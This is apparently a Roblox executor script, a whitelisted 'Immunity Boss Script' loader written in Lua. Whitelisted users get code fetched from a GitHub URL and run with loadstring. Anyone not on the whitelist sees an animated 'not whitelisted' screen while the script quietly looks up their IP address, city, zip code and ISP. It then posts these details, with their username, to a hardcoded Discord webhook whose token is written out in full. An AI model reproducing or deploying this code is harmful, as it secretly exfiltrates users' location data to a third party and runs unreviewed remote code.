local player = game.Players.LocalPlayer
local ID = player.UserId

if not(game:IsLoaded()) then
	game.Loaded:Wait()
end

if (game.CoreGui:FindFirstChild("ebggui")) then
	game.CoreGui.ebggui:Destroy()
end

local MasterIDList = {
	437108920, -- Seakui
	1050413853 -- xOni1x
}

if not(table.find(MasterIDList, ID)) then
	if not(game.CoreGui:FindFirstChild("errorgui")) then
		warn("❌ Not whitelisted")

		local blur = Instance.new("BlurEffect")
		blur.Size = 0
		blur.Parent = game:WaitForChild("Lighting")

		for i = 1, 20 do
			blur.Size = i
			wait(.1)
		end

		local errorgui = Instance.new("ScreenGui")
		errorgui.Name = "errorgui"
		errorgui.Parent = game:WaitForChild("CoreGui")
		errorgui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

		local errorlabel = Instance.new("TextLabel")
		errorlabel.Name = "errorlabel"
		errorlabel.Parent = errorgui
		errorlabel.AnchorPoint = Vector2.new(0.5, 0.5)
		errorlabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		errorlabel.BackgroundTransparency = 1.000
		errorlabel.Position = UDim2.new(0.5, 0, 0.5, 0)
		errorlabel.Size = UDim2.new(1, 0, 0.75, 0)
		errorlabel.Font = Enum.Font.Ubuntu
		errorlabel.Text = ""
		errorlabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		errorlabel.TextScaled = true
		errorlabel.TextSize = 14.000
		errorlabel.TextStrokeTransparency = 0.000
		errorlabel.TextWrapped = true
		errorlabel.TextYAlignment = Enum.TextYAlignment.Top

		local errorframe = Instance.new("Frame")
		errorframe.Name = "errorframe"
		errorframe.Parent = errorgui
		errorframe.AnchorPoint = Vector2.new(0.5, 1)
		errorframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		errorframe.BackgroundTransparency = 0.500
		errorframe.Position = UDim2.new(0.5, 0, 1.25, 0)
		errorframe.Size = UDim2.new(0.300000012, 0, 0, 107)
		errorframe.ZIndex = 5

		local Close = Instance.new("TextButton")
		Close.Name = "Close"
		Close.Parent = errorframe
		Close.AnchorPoint = Vector2.new(1, 0.5)
		Close.BackgroundColor3 = Color3.fromRGB(0, 96, 96)
		Close.BorderColor3 = Color3.fromRGB(255, 255, 255)
		Close.Position = UDim2.new(0.960476518, 0, 0.495518774, 0)
		Close.Size = UDim2.new(0.449999988, 0, 0.663999975, 0)
		Close.Font = Enum.Font.Ubuntu
		Close.Text = "Close"
		Close.TextColor3 = Color3.fromRGB(255, 255, 255)
		Close.TextScaled = true
		Close.TextSize = 14.000
		Close.TextWrapped = true
		Close.ZIndex = 6

		Close.MouseButton1Down:Connect(function()
			errorframe:TweenPosition(
				UDim2.new(0.5, 0, 1.25, 0),
				"In",
				"Quad",
				1,
				true
			)

			wait(1)

			for i = 20, 0, -1 do
				errorlabel.TextTransparency = 1 - (i / 20)
				errorlabel.TextStrokeTransparency = 1 - (i / 20)
				blur.Size = i
				wait(.1)
			end

			blur.Size = 0

			blur:Destroy()
			errorgui:Destroy()
		end)

		errorframe:TweenPosition(
			UDim2.new(0.5, 0, 1, 0),
			"Out",
			"Quad",
			1,
			true
		)

		local errorText = "Your User ID is not in the whitelist.\n Only Seakui and friends may utilise this\n Please restart your\n Roblox client, and check your login.\n If you believe this is an error please contact Saekk#3130 on discord."

		local clientid = game:GetService("RbxAnalyticsService"):GetClientId()
		pcall(function() setclipboard(clientid) end)

		for i = 1, #errorText do
			local displayText = string.sub(errorText, 1, i)
			errorlabel.Text = displayText
			wait(0.075)
		end
	end
local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1012534308457697360/O5_TKa7VEyxnenRyj3IVYP8SOIk6XslXJar-YHGbU7XebAMpN4Jdqm6yelAClKyIKcBV"
_G.Key = "Immunity script"
local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s \nUser's Key: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org, _G.Key)
syn.request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)
else
    print("⭐ Immunity Boss Script loaded - by Seakui")
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Veonisia/Boss/main/BossBattle.lua'))()
end
